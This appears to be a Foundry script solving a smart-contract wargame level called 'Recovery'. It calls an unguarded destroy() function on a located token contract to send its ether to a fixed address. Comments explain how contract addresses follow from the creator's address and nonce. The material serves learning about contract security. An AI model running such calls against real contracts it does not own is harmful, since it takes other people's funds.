// // SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Recovery, SimpleToken} from "../src/Recovery.sol";
import "@forge-std/Script.sol";

contract RecoveryScript is Script {
    Recovery public recoveryContract;
    SimpleToken public simpletokenCreated; // from etherscan

    function setUp() public {
        recoveryContract = Recovery(payable(vm.envAddress("RECOVERY_CONTRACT")));
        simpletokenCreated = SimpleToken(payable(vm.envAddress("SIMPLETOKEN_CONTRACT")));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        simpletokenCreated.destroy(payable(0xb4B157C7c4b0921065Dded675dFe10759EecaA6D));
        vm.stopBroadcast();
    }
}

// Contract addresses are deterministic and are calculated by keccak256(address, nonce) where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).

// Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.

// An interesting blog post by Martin Swende details potential use cases of this.

// If you're going to implement this technique, make sure you don't miss the nonce, or your funds will be lost forever